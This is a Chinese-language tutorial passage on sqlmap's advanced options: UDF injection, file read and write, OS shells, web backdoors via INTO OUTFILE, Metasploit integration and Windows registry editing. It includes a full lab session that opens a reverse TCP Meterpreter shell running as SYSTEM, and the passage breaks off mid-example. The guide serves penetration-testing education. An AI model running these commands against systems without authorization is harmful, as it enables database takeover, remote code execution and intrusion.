## 前言
上一篇文章：[记一份SQLmap使用手册小结（一）](https://xz.aliyun.com/t/3010)
希望各位大佬轻喷(QAQ)
本人博客：
### 其他高级
#### 用户自定义函数注入
参数：`–udf-inject,–shared-lib`
你可以通过编译`MySQL`注入你自定义的函数`（UDFs）或PostgreSQL`在`windows`中共享库，`DLL`，或者`Linux/Unix`中共享对象，
`sqlmap`将会问你一些问题，上传到服务器数据库自定义函数，然后根据你的选择执行他们，当你注入完成后，`sqlmap`将会移除它们。
#### 系统文件操作
**从数据库服务器中读取文件**
参数：`–file-read`
当数据库为`MySQL，PostgreSQL`或`Microsoft
SQLServer`，并且当前用户有权限使用特定的函数。读取的文件可以是文本也可以是二进制文件。
**把文件上传到数据库服务器中**
参数：`–file-write,–file-dest`
当数据库为`MySQL，PostgreSQL或Microsoft
SQLServer`，并且当前用户有权限使用特定的函数。上传的文件可以是文本也可以是二进制文件。
**运行任意操作系统命令**
参数：`–os-cmd,–os-shell`
当数据库为`MySQL，PostgreSQL或Microsoft SQL Server`，并且当前用户有权限使用特定的函数。
在`MySQL、PostgreSQL，sqlmap`上传一个二进制库，包含用户自定义的函数，`sys_exec()和sys_eval()`。
那么他创建的这两个函数可以执行系统命令。在`Microsoft SQLServer，sqlmap`将会使用`xp_cmdshell`存储过程，
如果被禁`（在Microsoft SQL Server2005`及以上版本默认禁制），`sqlmap`会重新启用它，如果不存在，会自动创建。
用`–os-shell`参数也可以模拟一个真实的`shell`，可以输入你想执行的命令。
当不能执行多语句的时候（比如php或者asp的后端数据库为`MySQL`时），仍然可能使用`INTOOUTFILE`写进可写目录，来创建一个web后门。支持的语言：
    1、ASP
    2、ASP.NET
    3、JSP
    4、PHP
**Meterpreter配合使用**
参数：`–os-pwn,–os-smbrelay,–os-bof,–priv-esc,–msf-path,–tmp-path`
当数据库为`MySQL，PostgreSQL或Microsoft
SQLServer`，并且当前用户有权限使用特定的函数，可以在数据库与攻击者直接建立`TCP`连接，
这个连接可以是一个交互式命令行的`Meterpreter`会话，`sqlmap`根据`Metasploit`生成`shellcode`，并有四种方式执行它：
    1. 通过用户自定义的sys_bineval()函数在内存中执行Metasplit的shellcode，支持MySQL和PostgreSQL数据库，参数：--os-pwn。
    2. 通过用户自定义的函数上传一个独立的payload执行，MySQL和PostgreSQL的sys_exec()函数，Microsoft SQL Server的xp_cmdshell()函数，参数：--os-pwn。
    3. 通过SMB攻击(MS08-068)来执行Metasploit的shellcode，当sqlmap获取到的权限足够高的时候（Linux/Unix的uid=0，Windows是Administrator），--os-smbrelay。
    4. 通过溢出Microsoft SQL Server 2000和2005的sp_replwritetovarbin存储过程(MS09-004)，在内存中执行Metasploit的payload，参数：--os-bof
列举一个`MySQL`例子：
    $ python sqlmap.py -u
    "http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?id=1" --os-pwn
    --msf-path /software/metasploit
    [...]
    [hh:mm:31] [INFO] the back-end DBMS is MySQL
    web server operating system: Windows 2003
    web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0
    back-end DBMS: MySQL 5.0
    [hh:mm:31] [INFO] fingerprinting the back-end DBMS operating system
    [hh:mm:31] [INFO] the back-end DBMS operating system is Windows
    how do you want to establish the tunnel?
    [1] TCP: Metasploit Framework (default)
    [2] ICMP: icmpsh - ICMP tunneling
    \>
    [hh:mm:32] [INFO] testing if current user is DBA
    [hh:mm:32] [INFO] fetching current user
    what is the back-end database management system architecture?
    [1] 32-bit (default)
    [2] 64-bit
    \>
    [hh:mm:33] [INFO] checking if UDF 'sys_bineval' already exist
    [hh:mm:33] [INFO] checking if UDF 'sys_exec' already exist
    [hh:mm:33] [INFO] detecting back-end DBMS version from its banner
    [hh:mm:33] [INFO] retrieving MySQL base directory absolute path
    [hh:mm:34] [INFO] creating UDF 'sys_bineval' from the binary UDF file
    [hh:mm:34] [INFO] creating UDF 'sys_exec' from the binary UDF file
    how do you want to execute the Metasploit shellcode on the back-end database
    underlying
    operating system?
    [1] Via UDF 'sys_bineval' (in-memory way, anti-forensics, default)
    [2] Stand-alone payload stager (file system way)
    \>
    [hh:mm:35] [INFO] creating Metasploit Framework multi-stage shellcode
    which connection type do you want to use?
    [1] Reverse TCP: Connect back from the database host to this machine (default)
    [2] Reverse TCP: Try to connect back from the database host to this machine, on
    all ports
    between the specified and 65535
    [3] Bind TCP: Listen on the database host for a connection
    \>
    which is the local address? [192.168.136.1]
    which local port number do you want to use? [60641]
    which payload do you want to use?
    [1] Meterpreter (default)
    [2] Shell
    [3] VNC
    \>
    [hh:mm:40] [INFO] creation in progress ... done
    [hh:mm:43] [INFO] running Metasploit Framework command line interface locally,
    please wait..
    \_
    \| \| o
    \_ \_ \_ \_ \_\|\_ \__, , \_ \| \| \_\_ \_\|\_
    / \|/ \|/ \| \|/ \| / \| / \\_\|/ \\_\|/ / \\_\| \|
    \| \| \|_/\|__/\|_/\\_/\|_/ \\/ \|__/ \|__/\\__/ \|_/\|_/
    /\|
    \\\|
    =[ metasploit v3.7.0-dev [core:3.7 api:1.0]
    \+ -- --=[ 674 exploits - 351 auxiliary
    \+ -- --=[ 217 payloads - 27 encoders - 8 nops
    =[ svn r12272 updated 4 days ago (2011.04.07)
    PAYLOAD =\> windows/meterpreter/reverse_tcp
    EXITFUNC =\> thread
    LPORT =\> 60641
    LHOST =\> 192.168.136.1
    [\*] Started reverse handler on 192.168.136.1:60641
    [\*] Starting the payload handler...
    [hh:mm:48] [INFO] running Metasploit Framework shellcode remotely via UDF
    'sys_bineval',
    please wait..
    [\*] Sending stage (749056 bytes) to 192.168.136.129
    [\*] Meterpreter session 1 opened (192.168.136.1:60641 -\>
    192.168.136.129:1689) at Mon Apr 11
    hh:mm:52 +0100 2011
    meterpreter \> Loading extension espia...success.
    meterpreter \> Loading extension incognito...success.
    meterpreter \> [-] The 'priv' extension has already been loaded.
    meterpreter \> Loading extension sniffer...success.
    meterpreter \> System Language : en_US
    OS : Windows .NET Server (Build 3790, Service Pack 2).
    Computer : W2K3R2
    Architecture : x86
    Meterpreter : x86/win32
    meterpreter \> Server username: NT AUTHORITY\\SYSTEM
    meterpreter \> ipconfig
    MS TCP Loopback interface
    Hardware MAC: 00:00:00:00:00:00
    IP Address : 127.0.0.1
    Netmask : 255.0.0.0
    Intel(R) PRO/1000 MT Network Connection
    Hardware MAC: 00:0c:29:fc:79:39
    IP Address : 192.168.136.129
    Netmask : 255.255.255.0
    meterpreter \> exit
    [\*] Meterpreter session 1 closed. Reason: User exit
默认情况下MySQL在`Windows`上以`SYSTEM`权限运行，`PostgreSQL`在`Windows`与`Linux`中是低权限运行，
`Microsoft SQL Server 2000`默认是以`SYSTEM`权限运行与2008大部分是以`NETWORK
SERVICE`有时是`LOCAL SERVICE`。
### 对Windows注册表操作
当数据库为`MySQL，PostgreSQL`或`Microsoft SQL
Server`，并且当前web应用支持堆查询。当然，当前连接数据库的用户也需要有权限操作注册表。
#### 读取注册表值
参数：`–reg-read`
#### 写入注册表值
参数：`–reg-add`
#### 删除注册表值
参数：`–reg-del`
#### 注册表辅助选项
参数：`–reg-key，–reg-value，–reg-data，–reg-type`
需要配合之前三个参数使用，例子：
    \$ python sqlmap.py -u http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1
    --reg-add --reg-key="HKEY_LOCAL_MACHINE\\SOFTWARE\\sqlmap" --reg-value=Test
    --reg-type=REG_SZ --reg-data=1
#### 常规参数
**从sqlite中读取session**
参数：`-s`
`sqlmap`对每一个目标都会在`output`路径下自动生成一个`SQLite`文件，如果用户想指定读取的文件路径，就可以用这个参数。
**保存HTTP(S)日志**
参数：`-t`
这个参数需要跟一个文本文件，`sqlmap`会把`HTTP(S)`请求与响应的日志保存到那里。
**非交互模式**
参数：`–batch`
用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。
**强制使用字符编码**
参数：`–charset`
不使用sqlmap自动识别的（如HTTP头中的Content-Type）字符编码，强制指定字符编码如：
    –charset=GBK
**爬行网站URL**  
参数：`–crawl`
`sqlmap`可以收集潜在的可能存在漏洞的连接，后面跟的参数是爬行的深度。
例子：
    $ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/" --batch --crawl=3
    [...]
    [xx:xx:53] [INFO] starting crawler
    [xx:xx:53] [INFO] searching for links with depth 1
    [xx:xx:53] [WARNING] running in a single-thread mode. This could take a while
    [xx:xx:53] [INFO] searching for links with depth 2
    [xx:xx:54] [INFO] heuristics detected web page charset 'ascii'
    [xx:xx:00] [INFO] 42/56 links visited (75%)
    [...]
**规定输出到CSV中的分隔符**
参数：`–csv-del`
当dump保存为CSV格式时`（–dump-format=CSV）`，需要一个分隔符默认是逗号，用户也可以改为别的  
如：
    –csv-del=”;”
**DBMS身份验证**
参数：`–dbms-cred`
某些时候当前用户的权限不够，做某些操作会失败，如果知道高权限用户的密码，可以使用此参数，有的数据库有专门的运行机制，
可以切换用户如`MicrosoftSQL Server的OPENROWSET`函数
**定义dump数据的格式**
参数：`–dump-format`
输出的格式可定义为：`CSV，HTML，SQLITE`
**预估完成时间**
参数：`–eta`
可以计算注入数据的剩余时间。
例如`Oracle`的布尔型盲注：
    $ python sqlmap.py -u
    "http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1" -b --eta
    [...]
    [hh:mm:01] [INFO] the back-end DBMS is Oracle
    [hh:mm:01] [INFO] fetching banner
    [hh:mm:01] [INFO] retrieving the length of query output
    [hh:mm:01] [INFO] retrieved: 64
    17% [========\> ] 11/64 ETA 00:19
然后：  
100% [===================================================] 64/64  
[hh:mm:53] [INFO] retrieved: Oracle Database 10g Enterprise Edition Release  
10.2.0.1.0 - Prod  
web application technology: PHP 5.2.6, Apache 2.2.9  
back-end DBMS: Oracle  
banner: 'Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod'  
sqlmap先输出长度，预计完成时间，显示百分比，输出字符
**刷新session文件**
参数：`–flush-session`
如果不想用之前缓存这个目标的session文件，可以使用这个参数。  
会清空之前的session，重新测试该目标。
**自动获取form表单测试**
参数：`–forms`
如果你想对一个页面的form表单中的参数测试，可以使用-r参数读取请求文件，或者通过–data参数测试。  
但是当使用–forms参数时，sqlmap会自动从-u中的url获取页面中的表单进行测试。
**忽略在会话文件中存储的查询结果**
参数：`–fresh-queries`
**忽略session文件保存的查询，重新查询。**
使用DBMS的hex函数
参数：`–hex`
有时候字符编码的问题，可能导致数据丢失，可以使用hex函数来避免：
针对`PostgreSQL`例子：
    $ python sqlmap.py -u "http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1"
    --banner --hex -v 3 --parse-errors
    [...]
    [xx:xx:14] [INFO] fetching banner
    [xx:xx:14] [PAYLOAD] 1 AND